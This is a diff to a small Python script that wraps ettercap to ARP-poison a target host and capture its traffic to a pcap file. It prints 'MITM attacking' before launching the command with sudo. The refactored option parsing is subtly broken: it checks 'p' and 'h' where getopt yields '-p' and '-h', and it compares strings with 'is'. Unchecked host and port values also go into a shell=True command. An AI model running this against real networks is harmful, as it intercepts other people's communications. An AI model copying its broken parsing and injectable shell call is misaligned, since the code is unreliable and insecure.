@@ -20,15 +20,14 @@ if len(sys.argv) < 2:
 
 (options, addr) = getopt(sys.argv[1:], "h:p:")
 
-try:
-    ip = socket.gethostbyname(options[0][1])
-except:
-    ip = addr[0]
+port = ''
+ip = addr[0]
 
-try:
-    port = options['p'][1]
-except:
-    port=''
+for option in options:
+    if option[0] is 'p':
+        port = option[1]
+    if option[0] is 'h':
+        ip = socket.gethostbyname(option[1])
 
 print ("MITM attacking {}. Stand by...".format(ip))
 p = Popen('sudo ettercap -i en1 -T -w /Users/bjacobel/Desktop/ettercap.pcap -M ARP /{}/ /{}/ output:'.format(ip,port), stdout = PIPE, stderr = STDOUT, shell = True)
